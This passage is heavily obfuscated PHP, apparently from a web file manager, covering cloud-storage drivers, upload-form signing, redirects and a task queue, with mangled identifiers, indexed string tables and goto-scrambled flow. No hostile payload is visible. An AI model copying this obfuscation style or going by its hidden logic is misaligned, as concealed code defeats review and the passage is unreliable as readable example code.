$‰®Ê‹ôÅ[119]) { return $‰®Ê‹ôÅ[1294]; } if ($ì“ŸëÛ‰[$‰®Ê‹ôÅ[33]] == $‰®Ê‹ôÅ[119] && $ßØæÊØ[$‰®Ê‹ôÅ[33]] == $‰®Ê‹ôÅ[961]) { return $‰®Ê‹ôÅ[120]; } return $‰®Ê‹ôÅ[1418]; } public static function driverType($˝˘‰äıì) { $πûıÇÓÁ =& $_SERVER[ˆë€Ï⁄∂]; $àπùí¶Ï = str_replace($πûıÇÓÁ[1419], $πûıÇÓÁ[12], strtolower($˝˘‰äıì->getType())); if ($àπùí¶Ï == $πûıÇÓÁ[848] || $àπùí¶Ï == $πûıÇÓÁ[1420] || $àπùí¶Ï == $πûıÇÓÁ[1421]) { $˝˘‰äıì = self::defaultDriverInit(); } else { if ($àπùí¶Ï == $πûıÇÓÁ[1304] || $àπùí¶Ï == $πûıÇÓÁ[1422]) { $˝˘‰äıì = IO::init($˝˘‰äıì->pathParse[$πûıÇÓÁ[1247]]); } } $€»è∂‰— = $˝˘‰äıì->path; $àπùí¶Ï = str_replace($πûıÇÓÁ[1419], $πûıÇÓÁ[12], strtolower($˝˘‰äıì->getType())); if ($àπùí¶Ï == $πûıÇÓÁ[119]) { return array($πûıÇÓÁ[33] => $πûıÇÓÁ[119], $πûıÇÓÁ[1416] => $πûıÇÓÁ[12], $πûıÇÓÁ[97] => $€»è∂‰—, $πûıÇÓÁ[108] => $˝˘‰äıì); } return array($πûıÇÓÁ[33] => $πûıÇÓÁ[961], $πûıÇÓÁ[1416] => $˝˘‰äıì->pathDriver, $πûıÇÓÁ[97] => $€»è∂‰—, $πûıÇÓÁ[108] => $˝˘‰äıì); } public static function pathDriverType($√ÑáöÆπ) { return $√ÑáöÆπ ? self::driverType(IO::init($√ÑáöÆπ)) : !1; } public static function pathDriverLocal($‚´ä…ôá) { $Îù·ƒüı =& $_SERVER[ˆë€Ï⁄∂]; $ÃåÄ√µÂ = $‚´ä…ôá ? self::driverType(IO::init($‚´ä…ôá)) : !1; return strtolower($ÃåÄ√µÂ[$Îù·ƒüı[33]]) == $Îù·ƒüı[119] ? !0 : !1; } public static function allowCover($ôÜÕÕ˝Ÿ, $∞ÅöÁ¶¬ = true) { $‰’ÊÀÖ„ =& $_SERVER[ˆë€Ï⁄∂]; if (is_string($ôÜÕÕ˝Ÿ)) { $ôÜÕÕ˝Ÿ = IO::info($ôÜÕÕ˝Ÿ); } if (!$ôÜÕÕ˝Ÿ || $ôÜÕÕ˝Ÿ[$‰’ÊÀÖ„[33]] == $‰’ÊÀÖ„[88] || $ôÜÕÕ˝Ÿ[$‰’ÊÀÖ„[89]] <= 100) { return !1; } if (isset($ôÜÕÕ˝Ÿ[$‰’ÊÀÖ„[1423]]) || !$ôÜÕÕ˝Ÿ[$‰’ÊÀÖ„[97]]) { return !1; } if (isset($ôÜÕÕ˝Ÿ[$‰’ÊÀÖ„[244]]) && !$ôÜÕÕ˝Ÿ[$‰’ÊÀÖ„[244]]) { return !1; } static $ÙÃûÌÍÃ = false; if (!$ÙÃûÌÍÃ || !$∞ÅöÁ¶¬) { $€·Îßªá = self::driverType(IO::init($ôÜÕÕ˝Ÿ[$‰’ÊÀÖ„[97]])); $≈ÂÚ´ó» = $€·Îßªá[$‰’ÊÀÖ„[108]]; $ÙÃûÌÍÃ = $‰’ÊÀÖ„[206]; if ($€·Îßªá[$‰’ÊÀÖ„[33]] == $‰’ÊÀÖ„[119]) { $ÙÃûÌÍÃ = $‰’ÊÀÖ„[1424]; } if ($€·Îßªá[$‰’ÊÀÖ„[108]] && is_array($€·Îßªá[$‰’ÊÀÖ„[108]]->config)) { $ÛÆ≥≠‰ = $€·Îßªá[$‰’ÊÀÖ„[108]]->config; if (isset($ÛÆ≥≠‰[$‰’ÊÀÖ„[1425]]) && $ÛÆ≥≠‰[$‰’ÊÀÖ„[1425]]) { $ÙÃûÌÍÃ = $‰’ÊÀÖ„[1424]; } } $ˆπ•∂‹ù = KodIO::defaultDriver(); if (strtolower($ˆπ•∂‹ù[$‰’ÊÀÖ„[108]]) == $‰’ÊÀÖ„[119] && is_array($ˆπ•∂‹ù[$‰’ÊÀÖ„[6]])) { $Æó›˙∫— = $ˆπ•∂‹ù[$‰’ÊÀÖ„[6]][$‰’ÊÀÖ„[1277]]; if (substr($Æó›˙∫—, 0, 2) == $‰’ÊÀÖ„[1426]) { $Æó›˙∫— = str_replace($‰’ÊÀÖ„[1426], BASIC_PATH, $Æó›˙∫—); } $Æó›˙∫— = str_replace($‰’ÊÀÖ„[266], $‰’ÊÀÖ„[8], $Æó›˙∫—); if (substr($ôÜÕÕ˝Ÿ[$‰’ÊÀÖ„[97]], 0, strlen($Æó›˙∫—)) == $Æó›˙∫—) { $ÙÃûÌÍÃ = $‰’ÊÀÖ„[206]; } } } return $ÙÃûÌÍÃ == $‰’ÊÀÖ„[1424] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ƒäŒøÅ‘) { parent::__construct($ƒäŒøÅ‘); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($ºåñ®ßÙ) { $üπãáïπ =& $_SERVER[ˆë€Ï⁄∂]; if (substr($ºåñ®ßÙ, 0, 7) == $üπãáïπ[228]) { $ºåñ®ßÙ = $üπãáïπ[229] . substr($ºåñ®ßÙ, 7); } header($üπãáïπ[185] . $ºåñ®ßÙ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($µÏ≥æ˜∫) { parent::__construct($µÏ≥æ˜∫); $this->setSignVersion($_SERVER[ˆë€Ï⁄∂][259]); } public function uploadFormData($‘Ûæ†°å, $˙«ªúœó = 3600) { $À¸Ÿ•ô± =& $_SERVER[ˆë€Ï⁄∂]; $Ó§°äÿò = $À¸Ÿ•ô±[241]; $∆©—Ï∆˝ = $À¸Ÿ•ô±[1427]; $›∏èè˙Œ = $À¸Ÿ•ô±[273]; $√¶«ó˚• = gmdate($À¸Ÿ•ô±[1428], time() + $˙«ªúœó); $˘â™∆ûÏ = (string) time() . $À¸Ÿ•ô±[84] . (string) (time() + $˙«ªúœó); $‘ñõÿ¶ò = array($À¸Ÿ•ô±[274] => $√¶«ó˚•, $À¸Ÿ•ô±[277] => array(array($À¸Ÿ•ô±[317] => $Ó§°äÿò), array($À¸Ÿ•ô±[278] => $this->bucket), array($À¸Ÿ•ô±[279], $À¸Ÿ•ô±[280], $À¸Ÿ•ô±[12]), array($À¸Ÿ•ô±[282] => $›∏èè˙Œ), array($À¸Ÿ•ô±[1429] => $∆©—Ï∆˝), array($À¸Ÿ•ô±[1430] => $this->accessKey), array($À¸Ÿ•ô±[1431] => $˘â™∆ûÏ))); $‘ñõÿ¶ò = json_encode($‘ñõÿ¶ò); $¯Ö„¨≤ã = hash_hmac($À¸Ÿ•ô±[1427], $˘â™∆ûÏ, $this->secret); $§åù⁄à© = sha1($‘ñõÿ¶ò); $«ÒÎÜ√‘ = hash_hmac($À¸Ÿ•ô±[1427], $§åù⁄à©, $¯Ö„¨≤ã); $¸…ì√’Ω = array($À¸Ÿ•ô±[317] => $Ó§°äÿò, $À¸Ÿ•ô±[282] => $›∏èè˙Œ, $À¸Ÿ•ô±[289] => base64_encode($‘ñõÿ¶ò), $À¸Ÿ•ô±[1429] => $∆©—Ï∆˝, $À¸Ÿ•ô±[1430] => $this->accessKey, $À¸Ÿ•ô±[1432] => $˘â™∆ûÏ, $À¸Ÿ•ô±[1433] => $«ÒÎÜ√‘, $À¸Ÿ•ô±[218] => $this->getHost()); return $¸…ì√’Ω; } public function fileOutImage($∞‰ÏÈ≤•, $ﬂá—í•˛ = 250) { $‡ÏÕ±ø„ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->size($∞‰ÏÈ≤•) > 1024 * 1024 * 32) { return $this->fileOutImageServer($∞‰ÏÈ≤•, $ﬂá—í•˛); } $≈≠ÏÇ†∫ = $this->link($∞‰ÏÈ≤•); $≈≠ÏÇ†∫ .= $‡ÏÕ±ø„[1434] . $ﬂá—í•˛ . $‡ÏÕ±ø„[1435]; $this->fileOutLink($≈≠ÏÇ†∫); } public function fileOutLink($ß¥®Úÿÿ) { $∑›¢Í‚› =& $_SERVER[ˆë€Ï⁄∂]; if (substr($ß¥®Úÿÿ, 0, 7) == $∑›¢Í‚›[228]) { $ß¥®Úÿÿ = $∑›¢Í‚›[229] . substr($ß¥®Úÿÿ, 7); } header($∑›¢Í‚›[185] . $ß¥®Úÿÿ); die; } } goto cªó∆¢Õé˜; a¡Æ◊úñ’≈: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÆÜ«¶¶™, $çıòﬁ„» = '', $±Í˘ÀÉπ = 0, $·°…ŸÎß = '') { $Ñ˙è«π =& $_SERVER[ˆë€Ï⁄∂]; $·°…ŸÎß = $·°…ŸÎß ? $·°…ŸÎß : ($çıòﬁ„» ? $çıòﬁ„» : $ÆÜ«¶¶™); $é¿ﬁï˚ü = new Task($ÆÜ«¶¶™, $çıòﬁ„», $±Í˘ÀÉπ, $·°…ŸÎß); $GLOBALS[$Ñ˙è«π[1871] . $ÆÜ«¶¶™] = new TaskLog($Ñ˙è«π[1770], $é¿ﬁï˚ü, $·°…ŸÎß); return $é¿ﬁï˚ü; } public function __construct($Ë¿˜ã‡… = '', $üª±€Ç’ = '', $‹€√Ω∞Õ = '') { $—Ñ•Ï…Â =& $_SERVER[ˆë€Ï⁄∂]; if (!$Ë¿˜ã‡…) { $Ë¿˜ã‡… = $—Ñ•Ï…Â[1770]; } $¬âãä»— = $Ë¿˜ã‡… . $—Ñ•Ï…Â[473] . rand_string(10); if (!$‹€√Ω∞Õ) { $‹€√Ω∞Õ = $Ë¿˜ã‡… . $—Ñ•Ï…Â[53] . $‹€√Ω∞Õ; } switch ($Ë¿˜ã‡…) { case $—Ñ•Ï…Â[1770]: if (!$üª±€Ç’ || !$üª±€Ç’->task) { return echoLog($Ë¿˜ã‡… . $—Ñ•Ï…Â[1872]); } $„ÉÉ˜ ç = $üª±€Ç’; $¬âãä»— = $„ÉÉ˜ ç->task[$—Ñ•Ï…Â[486]]; $Ë¿˜ã‡… = $„ÉÉ˜ ç->task[$—Ñ•Ï…Â[486]]; if (!$„ÉÉ˜ ç->task[$—Ñ•Ï…Â[1675]]) { $„ÉÉ˜ ç->task[$—Ñ•Ï…Â[1675]] = $‹€√Ω∞Õ ? $‹€√Ω∞Õ : $Ë¿˜ã‡…; } break; case $—Ñ•Ï…Â[1873]: if (!$üª±€Ç’) { return echoLog($Ë¿˜ã‡… . $—Ñ•Ï…Â[1874]); } $‡ÊáØﬁ⁄ = is_string($üª±€Ç’) ? array($üª±€Ç’) : $üª±€Ç’; $„ÉÉ˜ ç = new TaskFileTransfer($¬âãä»—, $Ë¿˜ã‡…, 0, $‹€√Ω∞Õ ? $‹€√Ω∞Õ : $‡ÊáØﬁ⁄[0]); foreach ($‡ÊáØﬁ⁄ as $ñ††òÂﬁ) { $„ÉÉ˜ ç->addPath($ñ††òÂﬁ); } break; case $—Ñ•Ï…Â[399]: if (!$üª±€Ç’) { return echoLog($Ë¿˜ã‡… . $—Ñ•Ï…Â[1874]); } $‡ÊáØﬁ⁄ = is_string($üª±€Ç’) ? array($üª±€Ç’) : $üª±€Ç’; $„ÉÉ˜ ç = new TaskZip($¬âãä»—, $Ë¿˜ã‡…, 0, $‹€√Ω∞Õ ? $‹€√Ω∞Õ : $‡ÊáØﬁ⁄[0]); foreach ($‡ÊáØﬁ⁄ as $ñ††òÂﬁ) { $„ÉÉ˜ ç->addPath($ñ††òÂﬁ); } break; case $—Ñ•Ï…Â[1314]: if (!$üª±€Ç’) { return echoLog($Ë¿˜ã‡… . $—Ñ•Ï…Â[1874]); } $„ÉÉ˜ ç = new TaskUnZip($¬âãä»—, $Ë¿˜ã‡…, 0, $‹€√Ω∞Õ ? $‹€√Ω∞Õ : $üª±€Ç’); if ($üª±€Ç’) { $„ÉÉ˜ ç->addFile($üª±€Ç’); } break; case $—Ñ•Ï…Â[162]: $„ÉÉ˜ ç = new TaskHttp($¬âãä»—, $Ë¿˜ã‡…); break; default: return; break; } $this->task = $„ÉÉ˜ ç; $this->taskID = $¬âãä»—; Hook::bind($—Ñ•Ï…Â[1808], array($this, $—Ñ•Ï…Â[1875])); Hook::bind($—Ñ•Ï…Â[1810], array($this, $—Ñ•Ï…Â[1876])); Hook::bind($—Ñ•Ï…Â[1804], array($this, $—Ñ•Ï…Â[1877])); echoLog($—Ñ•Ï…Â[1878] . $„ÉÉ˜ ç->task[$—Ñ•Ï…Â[1675]]); } public function __destruct() { $this->end(); } public function end($˜û◊¬  = '') { $˚¯∂íÊΩ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($˜û◊¬ ); $this->task = !1; $this->taskID = !1; Hook::unbind($˚¯∂íÊΩ[1808], array($this, $˚¯∂íÊΩ[1875])); Hook::unbind($˚¯∂íÊΩ[1810], array($this, $˚¯∂íÊΩ[1876])); Hook::unbind($˚¯∂íÊΩ[1804], array($this, $˚¯∂íÊΩ[1877])); } public function taskUpdate($‘ÒÇ´∆õ) { $ÃÂì∞úå =& $_SERVER[ˆë€Ï⁄∂]; if (!$‘ÒÇ´∆õ || $this->taskID != $‘ÒÇ´∆õ[$ÃÂì∞úå[486]]) { return; } $ΩÅÊ≤êì = 20; $⁄îÎ¨Öü = intval($‘ÒÇ´∆õ[$ÃÂì∞úå[1789]] * $ΩÅÊ≤êì); $è¶ã√∫´ = $ÃÂì∞úå[186] . str_repeat($ÃÂì∞úå[517], $⁄îÎ¨Öü) . $ÃÂì∞úå[1106] . str_repeat($ÃÂì∞úå[53], $ΩÅÊ≤êì - $⁄îÎ¨Öü) . $ÃÂì∞úå[188]; $Éÿ»π¢ø = $è¶ã√∫´ . sprintf($ÃÂì∞úå[1879], $‘ÒÇ´∆õ[$ÃÂì∞úå[1789]] * 100) . $ÃÂì∞úå[1880]; $◊˘ùé˝º = $Éÿ»π¢ø . $‘ÒÇ´∆õ[$ÃÂì∞úå[1788]] . $ÃÂì∞úå[8] . $‘ÒÇ´∆õ[$ÃÂì∞úå[1155]] . LNG($ÃÂì∞úå[1881]); $Úè¬ø¿‘ = $ÃÂì∞úå[12]; if ($‘ÒÇ´∆õ[$ÃÂì∞úå[1865]]) { $◊˘ùé˝º = $Éÿ»π¢ø . size_format($‘ÒÇ´∆õ[$ÃÂì∞úå[1788]]) . $ÃÂì∞úå[8] . size_format($‘ÒÇ´∆õ[$ÃÂì∞úå[1155]]); $Úè¬ø¿‘ = size_format($‘ÒÇ´∆õ[$ÃÂì∞úå[1790]]) . $ÃÂì∞úå[1882]; } if ($‘ÒÇ´∆õ[$ÃÂì∞úå[1157]]) { $‘ÒÇ´∆õ[$ÃÂì∞úå[1839]] = $‘ÒÇ´∆õ[$ÃÂì∞úå[1157]] . $ÃÂì∞úå[53] . $‘ÒÇ´∆õ[$ÃÂì∞úå[1839]]; } if ($‘ÒÇ´∆õ[$ÃÂì∞úå[1839]]) { $°Û•Í£® = $ÃÂì∞úå[12]; if ($‘ÒÇ´∆õ[$ÃÂì∞úå[1841]]) { $°Û•Í£® = $ÃÂì∞úå[50] . size_format($‘ÒÇ´∆õ[$ÃÂì∞úå[1842]]) . $ÃÂì∞úå[8] . size_format($‘ÒÇ´∆õ[$ÃÂì∞úå[1841]]); } $Úè¬ø¿‘ .= $‘ÒÇ´∆õ[$ÃÂì∞úå[1839]] . $°Û•Í£®; } if ($‘ÒÇ´∆õ[$ÃÂì∞úå[854]] && !$‘ÒÇ´∆õ[$ÃÂì∞úå[1841]]) { $Úè¬ø¿‘ .= $ÃÂì∞úå[53] . size_format($‘ÒÇ´∆õ[$ÃÂì∞úå[1846]]) . $ÃÂì∞úå[8] . size_format($‘ÒÇ´∆õ[$ÃÂì∞úå[854]]); } echoLog($◊˘ùé˝º . $ÃÂì∞úå[53] . $Úè¬ø¿‘, !0); } public function taskEnd($úïøèÙ ) { $§êõõË– =& $_SERVER[ˆë€Ï⁄∂]; if (!$úïøèÙ  || $this->taskID != $úïøèÙ [$§êõõË–[486]]) { return; } $‹Í∞¸Á¬ = $úïøèÙ  ? LNG($§êõõË–[1883]) . $§êõõË–[4] . $úïøèÙ [$§êõõË–[1788]] . $§êõõË–[8] . $úïøèÙ [$§êõõË–[1155]] . LNG($§êõõË–[1881]) . $§êõõË–[84] : $§êõõË–[12]; echoLog($§êõõË–[1884] . $úïøèÙ [$§êõõË–[1675]] . ($úïøèÙ [$§êõõË–[537]] ? $§êõõË–[84] . $úïøèÙ [$§êõõË–[537]] : $§êõõË–[12]) . $§êõõË–[84] . $‹Í∞¸Á¬ . $§êõõË–[1885] . sprintf($§êõõË–[943], timeFloat() - $úïøèÙ [$§êõõË–[1791]]) . $§êõõË–[1803]); $this->end(); } public function taskKill($ÃœÂäíì) { $∑πèŸÕü =& $_SERVER[ˆë€Ï⁄∂]; if (!$ÃœÂäíì || $this->taskID != $ÃœÂäíì[$∑πèŸÕü[486]]) { return; } echoLog($∑πèŸÕü[1886] . $ÃœÂäíì[$∑πèŸÕü[1675]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\x6b\x51\x75\145\165\145\114\x65\x6e\x67\x74\x68"; const QUEUE_DATA = "\164\x61\163\x6b\121\165\x65\x75\145\104\x61\x74\x61"; const QUEUE_TIME = "\164\x61\x73\x6b\x51\165\x65\x75\145\114\x61\x73\164\122\165\x6e"; const QUEUE_THREAD = "\164\x61\x73\x6b\121\x75\x65\x75\145\124\150\162\x65\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Œ˜Û˝ïﬂ, $ßÊÃõ˝÷ = array(), $Ìßéùßº = '', $‡àıπ¬« = '') { $ã¯ºÛ€’ =& $_SERVER[ˆë€Ï⁄∂]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($‡àıπ¬« && array_find_by_field(self::$listData, $ã¯ºÛ€’[107], $‡àıπ¬«)) { return !0; } if ($‡àıπ¬« && array_find_by_field(self::$listDataAdd, $ã¯ºÛ€’[107], $‡àıπ¬«)) { return !0; } self::$listDataAdd[] = array($ã¯ºÛ€’[352] => $Œ˜Û˝ïﬂ, $ã¯ºÛ€’[1887] => $ßÊÃõ˝÷, $ã¯ºÛ€’[537] => $Ìßéùßº, $ã¯ºÛ€’[107] => $‡àıπ¬«); return !0; } public static function addSubmit() { $÷£∂Ôç≥ =& $_SERVER[ˆë€Ï⁄∂]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($÷£∂Ôç≥[1888] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $÷£∂Ôç≥[12], $÷£∂Ôç≥[537])), $÷£∂Ôç≥[207]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ÑÔ®˛Ωé, $Ï…©ﬁ´∑ = array(), $ˆ£ﬂ∂““ = '', $î˛ÿÿô≠ = '') { $Æï∑¢˝Î =& $_SERVER[ˆë€Ï⁄∂]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ºÇ¸óˆß = self::getAll(); if ($î˛ÿÿô≠ && array_find_by_field($ºÇ¸óˆß, $Æï∑¢˝Î[107], $î˛ÿÿô≠)) { return !0; } $ºÇ¸óˆß[] = array($Æï∑¢˝Î[352] => $ÑÔ®˛Ωé, $Æï∑¢˝Î[1887] => $Ï…©ﬁ´∑, $Æï∑¢˝Î[537] => $ˆ£ﬂ∂““, $Æï∑¢˝Î[107] => $î˛ÿÿô≠); self::setAll($ºÇ¸óˆß); write_log($Æï∑¢˝Î[1888] . $ˆ£ﬂ∂““, $Æï∑¢˝Î[207]); return !0; } public static function run() { $òÑËÊÿ® =& $_SERVER[ˆë€Ï⁄∂]; $π£⁄°°é = self::getAll(); $‚∏‹Ñ”– = array_shift($π£⁄°°é); if (!$‚∏‹Ñ”–) { return !1; } self::setAll($π£⁄°°é); $Ÿ”Ü¨òò = timeFloat(); $Í…◊‚ö = $òÑËÊÿ®[12]; try { $Í…◊‚ö = Hook::apply($‚∏‹Ñ”–[$òÑËÊÿ®[352]], $‚∏‹Ñ”–[$òÑËÊÿ®[1887]]); } catch (Exception $≤Ù°æé÷) { write_log($≤Ù°æé÷, $òÑËÊÿ®[1279]); } $„‰π©ø“ = number_format(timeFloat() - $Ÿ”Ü¨òò, 3) . $òÑËÊÿ®[1803]; if ($Í…◊‚ö && is_string($Í…◊‚ö)) { $„‰π©ø“ = $„‰π©ø“ . $òÑËÊÿ®[1889] . $Í…◊‚ö; } write_log($òÑËÊÿ®[1890] . $‚∏‹Ñ”–[$òÑËÊÿ®[537]] . $òÑËÊÿ®[1891] . $„‰π©ø“, $òÑËÊÿ®[207]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $∆ﬁà™Äø =& $_SERVER[ˆë€Ï⁄∂]; $ ›±ù—ë = self::threadCount() + 1; if ($ ›±ù—ë > 3 || !self::count()) { return; } write_log($∆ﬁà™Äø[1892] . $ ›±ù—ë, $∆ﬁà™Äø[207]); Cache::set(self::QUEUE_THREAD, $ ›±ù—ë, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($∆ﬁà™Äø[1893], $∆ﬁà™Äø[207]); } public static function getKey($›˜ìÖÕì, $ƒî≤»êÜ = "\151\x6e\164") { $ñë¬´È≈ =& $_SERVER[ˆë€Ï⁄∂]; Cache::removeMemory($›˜ìÖÕì); $« ¢çß« = Cache::get($›˜ìÖÕì); if ($ƒî≤»êÜ == $ñë¬´È≈[374]) { return $« ¢çß« ? intval($« ¢çß«) : 0; } if ($ƒî≤»êÜ == $ñë¬´È≈[1894]) { return is_array($« ¢çß«) ? $« ¢çß« : array(); } return $« ¢çß«; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ˆë€Ï⁄∂][1894]); } public static function setAll($¯∑öÎ©ì) { $˙éï”πå = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¯∑öÎ©ì), $˙éï”πå); Cache::set(self::QUEUE_DATA, $¯∑öÎ©ì, $˙éï”πå); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¸Õ‘Å˚‡, $∑·†Ù‡Û = 5.0) { if (!$¸Õ‘Å˚‡) { return; } $ëÒœä¸˙ = Cache::get($¸Õ‘Å˚‡); if (!$ëÒœä¸˙ || timeFloat() - floatVal($ëÒœä¸˙) >= $∑·†Ù‡Û) { Cache::set($¸Õ‘Å˚‡, timeFloat(), $∑·†Ù‡Û * 10); return !0; } return !1; } public static function timeLimitCall($˜ËÛ¨–˜, $≈ëˆö¬Ô, $› »ç≠·, $ÀÓÏ„Øõ = 5.0) { $◊‰¨’”Ô =& $_SERVER[ˆë€Ï⁄∂]; if (!$˜ËÛ¨–˜ || !$≈ëˆö¬Ô) { return; } self::$asyncAdd = !0; $’È£∂´ö = $◊‰¨’”Ô[1895]; $ü≤Ø¨¯Û = Cache::get($’È£∂´ö, !0); $Éò÷”…Ï = array($◊‰¨’”Ô[1896] => timeFloat(), $◊‰¨’”Ô[1897] => timeFloat(), $◊‰¨’”Ô[352] => $≈ëˆö¬Ô, $◊‰¨’”Ô[1887] => $› »ç≠·, $◊‰¨’”Ô[216] => $ÀÓÏ„Øõ); if (is_array($ü≤Ø¨¯Û[$˜ËÛ¨–˜])) { $Éò÷”…Ï[$◊‰¨’”Ô[1897]] = $ü≤Ø¨¯Û[$˜ËÛ¨–˜][$◊‰¨’”Ô[1897]]; } if (is_array($ü≤Ø¨¯Û[$˜ËÛ¨–˜])) { if (timeFloat() - $ü≤Ø¨¯Û[$˜ËÛ¨–˜][$◊‰¨’”Ô[1896]] < $Éò÷”…Ï[$◊‰¨’”Ô[216]] * 0.3) { return; } $Éò÷”…Ï[$◊‰¨’”Ô[1897]] = $ü≤Ø¨¯Û[$˜ËÛ¨–˜][$◊‰¨’”Ô[1897]]; } $ü≤Ø¨¯Û[$˜ËÛ¨–˜] = $Éò÷”…Ï; Cache::set($’È£∂´ö, $ü≤Ø¨¯Û, 60); Cache::removeMemory($’È£∂´ö); write_log($◊‰¨’”Ô[1898] . $˜ËÛ¨–˜ . $◊‰¨’”Ô[84] . $≈ëˆö¬Ô, $◊‰¨’”Ô[207]); } public static function timeLimitCallLoop() { $Î›àÄ˚∏ =& $_SERVER[ˆë€Ï⁄∂]; $ç‰º∞Òÿ = array($Î›àÄ˚∏[1899]); $“Íœ≈˚Á = in_array(strtolower(ACTION), $ç‰º∞Òÿ); if (!$“Íœ≈˚Á && !self::$asyncAdd) { return; } $˙˚Ã≈ƒí = $Î›àÄ˚∏[1895]; $¥Ï÷üÒﬂ = Cache::get($˙˚Ã≈ƒí, !0); if (!$¥Ï÷üÒﬂ || count($¥Ï÷üÒﬂ) <= 0) { return; } $€µ‚ﬁç∆ = !1; $ªÌ†’…˘ = timeFloat(); $ñîåºÿ≤ = array(); foreach ($¥Ï÷üÒﬂ as $ÃôÚ˝õƒ => $ì˜ß…›‰) { if ($ªÌ†’…˘ - $ì˜ß…›‰[$Î›àÄ˚∏[1897]] > $ì˜ß…›‰[$Î›àÄ˚∏[216]]) { $€µ‚ﬁç∆ = !0; try { Hook::apply($ì˜ß…›‰[$Î›àÄ˚∏[352]], $ì˜ß…›‰[$Î›àÄ˚∏[1887]]); write_log($Î›àÄ˚∏[1900] . $ÃôÚ˝õƒ . $Î›àÄ˚∏[84] . $ì˜ß…›‰[$Î›àÄ˚∏[352]] . $Î›àÄ˚∏[1901] . ACTION, $Î›àÄ˚∏[207]); } catch (Exception $õÔ‘‹Œ˛) { } continue; } $ñîåºÿ≤[$ÃôÚ˝õƒ] = $ì˜ß…›‰; } if (!$€µ‚ﬁç∆) { return; } if (!$ñîåºÿ≤) { return Cache::remove($˙˚Ã≈ƒí); } Cache::set($˙˚Ã≈ƒí, $ñîåºÿ≤, 60); Cache::removeMemory($˙˚Ã≈ƒí); } public static function finished($⁄Ò‡Î˘˙, $◊ö…€Æ∫) { $¶Â¢»¸‹ =& $_SERVER[ˆë€Ï⁄∂]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¶Â¢»¸‹[352] => $⁄Ò‡Î˘˙, $¶Â¢»¸‹[1887] => $◊ö…€Æ∫); } private static function finishedRun() { $öŒŸ∫®® =& $_SERVER[ˆë€Ï⁄∂]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $∂ªúÛã) { try { Hook::apply($∂ªúÛã[$öŒŸ∫®®[352]], $∂ªúÛã[$öŒŸ∫®®[1887]]); } catch (Exception $„ﬂÜµÛë) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto CπÒîΩè√; cªó∆¢Õé˜: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ˆ’€ıŒó) { $this->pathParse = $ˆ’€ıŒó; $this->model = Model($_SERVER[ˆë€Ï⁄∂][1436]); } public function getPath($¡¯† ŒÁ) { return trim($¡¯† ŒÁ, $_SERVER[ˆë€Ï⁄∂][8]); } public function pathFather($⁄ƒüåÊ∆) { $£¬Àı£∆ = $this->parse($⁄ƒüåÊ∆); $£¬Àı£∆ = $this->infoSimple($⁄ƒüåÊ∆); return $£¬Àı£∆ ? $£¬Àı£∆[$_SERVER[ˆë€Ï⁄∂][202]] : !1; } public function pathThis($≠≤∑≥πã) { $¯–≠âÃ” = $this->infoSimple($≠≤∑≥πã); return $¯–≠âÃ” ? $¯–≠âÃ”[$_SERVER[ˆë€Ï⁄∂][32]] : !1; } public function getPathOuter($ÒÁèçìü) { if (!$ÒÁèçìü) { return $ÒÁèçìü; } $Å¬ŸÙ¿ÿ = $this->parse($ÒÁèçìü); return KodIO::make($Å¬ŸÙ¿ÿ[$_SERVER[ˆë€Ï⁄∂][486]]); } public function copyFolderFromIO($ŒÚ¡ºŒ◊, $°æÂêÁ®, $ùññÓ≤¶, $âÜ∑Æ«‹, $ÃàæÌè„) { $¨µ¨¥ê∞ = $this->model->copyFolderFromIO($ŒÚ¡ºŒ◊, $°æÂêÁ®, $ùññÓ≤¶, $âÜ∑Æ«‹, $ÃàæÌè„); return KodIO::make($¨µ¨¥ê∞); } public function isParentOf($´∑ÿªÊî, $é™Óêµ€) { return $this->model->isParentOf($´∑ÿªÊî, $é™Óêµ€); } public function mkfile($¨ª‘äÜú, $›∫¨¡Ωº = '', $óòçæ–ö = REPEAT_RENAME) { $„ß«≥º« =& $_SERVER[ˆë€Ï⁄∂]; $‚˝©¿÷¥ = $this->parse($¨ª‘äÜú); $¨ª‘äÜú = $‚˝©¿÷¥[$„ß«≥º«[486]]; for ($Ã⁄‘Ä÷˛ = 0; $Ã⁄‘Ä÷˛ < count($‚˝©¿÷¥[$„ß«≥º«[1437]]); $Ã⁄‘Ä÷˛++) { $Ï◊ê¿Ù– = $‚˝©¿÷¥[$„ß«≥º«[1437]][$Ã⁄‘Ä÷˛]; if ($Ã⁄‘Ä÷˛ == 